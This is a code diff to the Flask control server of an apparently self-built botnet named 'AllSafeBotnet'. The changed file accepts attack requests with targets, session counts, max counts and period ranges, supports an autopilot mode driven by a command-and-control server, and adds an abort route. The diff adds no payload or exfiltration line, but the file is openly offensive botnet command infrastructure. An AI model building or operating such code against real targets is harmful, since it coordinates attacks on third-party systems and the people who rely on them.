@@ -30,6 +30,8 @@ from utils.config import rootSchema, targetSchema, requestSchema
 
 app = Flask(__name__)
 
+allsafe = Botnet.AllSafeBotnet()
+
 """
 The Botnet will use a simple implementation of a micro WebServer using Flask
 
@@ -43,6 +45,17 @@ If the method is GET, the login form will be shown.
 @app.route("/", methods=['GET', 'POST'])
 def showControlPage():
     return render_template("localcontrolpage.html")
+
+
+@app.route("/abort", methods=['GET','POST'])
+def abort():
+    try:
+        allsafe.abort()
+    except Exception as e:
+        print(str(e))
+        return "Internal Server Error", 500
+
+    return "OK", 200
 
 """
 In the controlpage you can submit a new request of two different type: upload or attack.
@@ -61,7 +74,6 @@ def performAttack():
     try:
         # retrieving and polishing C&C server and prepare config file
         if 'autopilot_start' in request.json:
-            allsafe = Botnet.AllSafeBotnet()
             allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']), override=False)
             return "OK", 200
 
@@ -69,7 +81,6 @@ def performAttack():
         cc_server = prepareConfigFile(request.json)
         config_path = './data/current_attack.json'
         # prepare botnet resources
-        allsafe = Botnet.AllSafeBotnet()
         # if the attack to be carried without updates from C&C?
         if 'local_attack' in request.json:
             allsafe.attack(config_path, override=True)
@@ -99,9 +110,13 @@ def prepareConfigFile(params, where='./data/current_attack.json'):
     for elem in params['target']:
         # Creation of the locaTargetSchema based upon the TargetSchema
         localTargetSchema = dict()
-        localTargetSchema['period'] = int(elem['period']) if 'period' in elem else 1
-        localTargetSchema['max_count'] = int(elem['max_count']) if 'max_count' in elem else 15
         localTargetSchema['sessions'] = int(elem['sessions']) if 'sessions' in elem else 1
+        localTargetSchema['max_count'] = int(elem['max_count']) if 'max_count' in elem else 15
+
+        if elem['min_period'] == "" or elem['max_period'] == "":
+            localTargetSchema['period'] = ""
+        else:
+            localTargetSchema['period'] = elem['min_period'] + "-" + elem['max_period']
 
         # Creation of the actionCondition dictionary
         actionConditions = OrderedDict()
@@ -199,7 +214,7 @@ if __name__ == "__main__":
     print("-------------------------------------------------------------")
     
     if len(sys.argv) == 1:
-        app.run(host='0.0.0.0', port=4042)
+        app.run(threaded=True, host='0.0.0.0', port=4042)
 
     # check for command line headless mode arguments 
     for argument in sys.argv:
